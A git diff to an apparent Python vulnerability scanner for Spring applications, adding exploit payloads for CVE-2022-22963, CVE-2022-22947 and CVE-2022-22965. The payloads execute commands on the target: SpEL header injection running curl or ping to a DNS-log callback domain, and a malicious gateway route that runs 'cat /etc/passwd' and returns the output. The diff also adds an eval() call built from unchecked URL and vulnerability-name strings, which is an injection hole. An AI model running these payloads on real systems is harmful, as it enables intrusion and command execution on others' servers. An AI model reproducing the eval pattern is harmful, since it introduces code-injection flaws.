@@ -32,6 +32,7 @@ from lib.tool.md5 import md5, random_md5
 from lib.tool.logger import logger
 from lib.tool.thread import thread
 from lib.tool import check
+from lib.tool import head
 from thirdparty import requests
 from time import sleep
 
@@ -89,7 +90,19 @@ class Spring():
         self.cve_2022_22963_payloads = [
             {
                 'path': 'functionRouter',
-                'data': 'mouse'
+                'data': 'mouse',
+                'headers': head.merge(self.headers, {
+                    'spring.cloud.function.routing-expression': 'T(java.lang.Runtime).getRuntime().exec("curl dnsdomain")',
+                    'Content-Type': 'text/plain'
+                })
+            },
+            {
+                'path': 'functionRouter',
+                'data': 'mouse',
+                'headers': head.merge(self.headers, {
+                    'spring.cloud.function.routing-expression': 'T(java.lang.Runtime).getRuntime().exec("ping dnsdomain")',
+                    'Content-Type': 'text/plain'
+                })
             }
         ]
 
@@ -106,20 +119,44 @@ class Spring():
     }
   }],
   "uri": "http://example.com"
-}'''
+}''',
+                'headers': head.merge(self.headers, {'Content-Type': 'application/json'})
             },
-            # {
-            #     'path': 'actuator/gateway/refresh',
-            #     'data': ''
-            # },
-            # {
-            #     'path': 'actuator/gateway/routes/hacktest',
-            #     'data': ''
-            # },
-            # {
-            #     'path': 'actuator/gateway/routes/hacktest',
-            #     'data': ''
-            # }
+            {
+                'path': 'gateway/refresh',
+                'data': '',
+                'headers': head.merge(self.headers, {'Content-Type': 'application/json'})
+            },
+            {
+                'path': 'gateway/routes/mouse',
+                'data': '',
+                'headers': head.merge(self.headers, {'Content-Type': 'application/json'})
+            },
+            {   # * 路径不同
+                'path': 'actuator/gateway/routes/mouse',
+                'data': '''{
+  "id": "mouse",
+  "filters": [{
+    "name": "AddResponseHeader",
+    "args": {
+      "name": "Result",
+      "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\\"cat\\\",\\\"/etc/passwd\\\"}).getInputStream()))}"
+    }
+  }],
+  "uri": "http://example.com"
+}''',
+                'headers': head.merge(self.headers, {'Content-Type': 'application/json'})
+            },
+            {
+                'path': 'actuator/gateway/refresh',
+                'data': '',
+                'headers': head.merge(self.headers, {'Content-Type': 'application/json'})
+            },
+            {
+                'path': 'actuator/gateway/routes/mouse',
+                'data': '',
+                'headers': head.merge(self.headers, {'Content-Type': 'application/json'})
+            }
         ]
 
     def cve_2022_22965_scan(self, url):
@@ -169,6 +206,19 @@ class Spring():
                         verify=False
                     )
                 logger.logging(vul_info, res.status_code, res)                        # * LOG
+
+                verify_url = url + 'mouse.jsp'
+                for i in range(3):
+                    sleep(2.5)                                # * 延时, 因为命令执行的回显可能有延迟, 要等一会判断结果才准确
+                    verify_res = requests.get(
+                        verify_url, 
+                        timeout=self.timeout, 
+                        headers=self.headers,
+                        proxies=self.proxies, 
+                        verify=False,
+                        allow_redirects=False
+                    )
+                    logger.logging(vul_info, verify_res.status_code, verify_res)
             except requests.ConnectTimeout:
                 logger.logging(vul_info, 'Timeout')
                 return None
@@ -179,32 +229,19 @@ class Spring():
                 logger.logging(vul_info, 'Error')
                 return None
 
-            verify_url = url + 'mouse.jsp'
-            for i in range(3):
-                sleep(2.5)                                # * 延时, 因为命令执行的回显可能有延迟, 要等一会判断结果才准确
-                verify_res = requests.get(
-                    verify_url, 
-                    timeout=self.timeout, 
-                    headers=self.headers,
-                    proxies=self.proxies, 
-                    verify=False,
-                    allow_redirects=False
-                )
-                logger.logging(vul_info, verify_res.status_code, verify_res)
-
-                if ((verify_res.status_code == 200) and ('CVE/2022/22965' in verify_res.text)):
-                    results = {
-                        'Target': target,
-                        'Verify': verify_url,
-                        'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
+            if ((verify_res.status_code == 200) and ('CVE/2022/22965' in verify_res.text)):
+                results = {
+                    'Target': verify_url,
+                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
+                    'Payload': {
                         'Method': vul_info['vul_method'],
-                        'Payload': {
-                            'url': url,
-                            'Data': data,
-                            'Headers': vul_info['headers']
-                        }
+                        'Url': url,
+                        'Path': path,
+                        'Data': data,
+                        'Headers': vul_info['headers']
                     }
-                    return results
+                }
+                return results
 
     def cve_2021_21234_scan(self, url):
         ''' spring-boot-actuator-logview文件包含漏洞
@@ -336,21 +373,18 @@ class Spring():
         vul_info['vul_type'] = 'RCE'
         vul_info['vul_id'] = 'CVE-2022-22963'
         vul_info['vul_method'] = 'POST'
-        vul_info['headers'] = {
-            'spring.cloud.function.routing-expression': 'T(java.lang.Runtime).getRuntime().exec("ping dnsdomain")'.replace('dnsdomain', dns_domain),
-            'Content-Type': 'text/plain'
-        }
-
-        headers = self.headers.copy()
-        headers.update(vul_info['headers'])
 
         for payload in self.cve_2022_22963_payloads:
             path = payload['path']
             data = payload['data']
+            headers = payload['headers']
             target = url + path
+            # * 在payload里面添加dnslog域名
+            headers['spring.cloud.function.routing-expression'] = headers['spring.cloud.function.routing-expression'].replace('dnsdomain', dns_domain)
 
             vul_info['path'] = path
             vul_info['data'] = data
+            vul_info['headers'] = headers
             vul_info['target'] = target
 
             try:
@@ -383,7 +417,7 @@ class Spring():
                         'Url': url,
                         'Path': path,
                         'Data': data,
-                        'Headers': vul_info['headers']
+                        'Headers': headers
                     }
                 }
                 return results
@@ -398,73 +432,67 @@ class Spring():
         vul_info['vul_type'] = 'RCE'
         vul_info['vul_id'] = 'CVE-2022-22947'
         vul_info['vul_method'] = 'POST'
-        vul_info['headers'] = {
-            'Content-Type': 'application/json'
-        }
 
-        headers = self.headers.copy()
-        headers.update(vul_info['headers'])
-
-        for payload in self.cve_2022_22947_payloads:
-            path = payload['path']
-            data = payload['data']
+        for payload in range(len(self.cve_2022_22947_payloads)):
+            path = self.cve_2022_22947_payloads[payload]['path']
+            data = self.cve_2022_22947_payloads[payload]['data']
+            headers = self.cve_2022_22947_payloads[payload]['headers']
             target = url + path
 
             vul_info['path'] = path
             vul_info['data'] = data
+            vul_info['headers'] = headers
             vul_info['target'] = target
 
             try:
-                res1 = requests.post(
+                if ((payload + 1) % 3 == 0):        # * 判断路由是否创建成功
+                    res = requests.get(
                     target, 
                     timeout=self.timeout, 
                     headers=headers,
-                    data=data, 
                     proxies=self.proxies, 
                     verify=False,
                     allow_redirects=False
                 )
-                logger.logging(vul_info, res1.status_code, res1)                        # * LOG
-
-                if (res1.status_code == 201):
-                    target2 = url + 'gateway/refresh'
-                    res2 = requests.post(
-                        target2, 
+                else:
+                    res = requests.post(
+                        target, 
                         timeout=self.timeout, 
-                        headers=self.headers,
+                        headers=headers,
+                        data=data, 
                         proxies=self.proxies, 
                         verify=False,
                         allow_redirects=False
                     )
-                    logger.logging(vul_info, res2.status_code, res2)                        # * LOG
+                logger.logging(vul_info, res.status_code, res)                        # * LOG
 
-                    if (res2.status_code == 200):
-                        target3 = target
-                        res3 = requests.get(
-                            target3, 
-                            timeout=self.timeout, 
-                            headers=self.headers,
-                            proxies=self.proxies, 
-                            verify=False,
-                            allow_redirects=False
-                    )
-                        logger.logging(vul_info, res3.status_code, res3)                        # * LOG
-
-                        if ((res3.status_code == 200) 
-                            and (('/sbin/nologin' in res3.text) 
-                                or ('root:x:0:0:root' in res3.text))):
-                            results = {
-                                'Target': target,
-                                'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
-                                'Method': vul_info['vul_method'],
-                                'Payload': {
-                                    'Url': url,
-                                    'Path': path,
-                                    'Data': data,
-                                    'Headers': vul_info['headers']
-                                }
-                            }
-                            return results
+                if ((res.status_code == 200) 
+                    and (('/sbin/nologin' in res.text) 
+                        or ('root:x:0:0:root' in res.text))):
+                    results = {
+                        'Target': target,
+                        'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
+                        'Headers': headers,
+                        'Payload-1': {
+                            'Method': 'POST',
+                            'Url': url,
+                            'Path': self.cve_2022_22947_payloads[payload-2]['path'],
+                            'Data': self.cve_2022_22947_payloads[payload-2]['data']
+                        },
+                        'Payload-2': {
+                            'Method': 'GET',
+                            'Url': url,
+                            'Path': self.cve_2022_22947_payloads[payload-1]['path'],
+                            'Data': self.cve_2022_22947_payloads[payload-1]['data']
+                        },
+                        'Payload-3': {
+                            'Method': 'POST',
+                            'Url': url,
+                            'Path': path,
+                            'Data': data
+                        }
+                    }
+                    return results
 
             except requests.ConnectTimeout:
                 logger.logging(vul_info, 'Timeout')
@@ -476,7 +504,10 @@ class Spring():
                 logger.logging(vul_info, 'Error')
                 return None
 
-    def addscan(self, url):
+    def addscan(self, url, vuln=None):
+        if vuln:
+            return eval('thread(target=self.{}_scan, url="{}")'.format(vuln, url))
+
         return [
             thread(target=self.cve_2020_5410_scan, url=url),
             thread(target=self.cve_2021_21234_scan, url=url),
